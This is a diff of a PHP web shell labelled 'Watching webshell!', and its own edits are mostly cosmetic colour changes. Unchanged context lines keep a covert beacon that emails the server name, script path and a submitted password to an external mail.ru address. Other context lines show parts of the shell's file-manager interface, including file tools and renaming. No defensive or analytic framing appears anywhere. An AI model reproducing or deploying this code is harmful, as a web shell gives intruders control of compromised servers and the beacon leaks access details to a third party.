@@ -1,4 +1,4 @@
-﻿<?php
+<?php
 //--------------Watching webshell!--------------
 if(array_key_exists('watching',$_POST)){
 	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('hard_linux@mail.ru', 'root', $tmp); // Edit or delete!
@@ -92,12 +92,12 @@ function hardHeader() {
 	a:hover		{text-decoration:underline;}
 	.tooltip::after {background:#0663D5;color:#FFF;content: attr(data-tooltip);margin-top:-50px;display:block;padding:6px 10px;position:absolute;visibility:hidden;}
 	.tooltip:hover::after {opacity:1;visibility:visible;}
-	.ml1		{border:1px solid #1e252e;padding:5px;margin:0;overflow:auto;}
+	.ml1		{border:1px solid #202832;padding:5px;margin:0;overflow:auto;}
 	.bigarea	{min-width:100%;max-width:100%;height:400px;}
-	input, textarea, select	{margin:0;color:#fff;background-color:#1e252e;border:1px solid #060a10; font:9pt Courier New;outline:none;}
+	input, textarea, select	{margin:0;color:#fff;background-color:#202832;border:1px solid #060a10; font:9pt Courier New;outline:none;}
 	label {position:relative}
 	label:after {content:'<>';font:10px 'Consolas', monospace;color:#fff;-webkit-transform:rotate(90deg);-moz-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg);right:3px; top:3px;padding:0;position:absolute;pointer-events:none;}
-	label:before {content:'';right:0; top:0;width:17px; height:17px;background:#1e252e;position:absolute;pointer-events:none;display:block;}
+	label:before {content:'';right:0; top:0;width:17px; height:17px;background:#202832;position:absolute;pointer-events:none;display:block;}
 	form		{margin:0px;}
 	#toolsTbl	{text-align:center;}
 	#fak 		{background:none;}
@@ -109,7 +109,7 @@ function hardHeader() {
 	.main td, th{vertical-align:middle;}
 	input[type='submit']:hover{background-color:#0663D5;}
 	input[type='button']:hover{background-color:#0663D5;}
-	.l1			{background-color:#1e252e;}
+	.l1			{background-color:#202832;}
 	pre			{font:9pt Courier New;}
 </style>
 <script>
@@ -169,7 +169,7 @@ function hardHeader() {
 			} else alert('Request error!');
 	}
 </script>
-<head><body><div style='position:absolute;background-color:rgba(46, 110, 156, 0.1);width:100%;top:0;left:0;'>
+<head><body><div style='position:absolute;background-color:rgba(95, 110, 130, 0.3);width:100%;top:0;left:0;'>
 <form method=post name=mf style='display:none;'>
 <input type=hidden name=a>
 <input type=hidden name=c>
@@ -552,7 +552,7 @@ function actionFilesTools() {
 					$h[2] .= "\n";
 				}
 		 	}
-			echo '<table cellspacing=1 cellpadding=5 bgcolor=#222><tr><td bgcolor=#1e252e><span style="font-weight: normal;"><pre>'.$h[0].'</pre></span></td><td bgcolor=#060a10><pre>'.$h[1].'</pre></td><td bgcolor=#1e252e><pre>'.htmlspecialchars($h[2]).'</pre></td></tr></table>';
+			echo '<table cellspacing=1 cellpadding=5 bgcolor=#222><tr><td bgcolor=#202832><span style="font-weight: normal;"><pre>'.$h[0].'</pre></span></td><td bgcolor=#060a10><pre>'.$h[1].'</pre></td><td bgcolor=#202832><pre>'.htmlspecialchars($h[2]).'</pre></td></tr></table>';
 			break;
 		case 'rename':
 			if( !empty($_POST['p3']) ) {
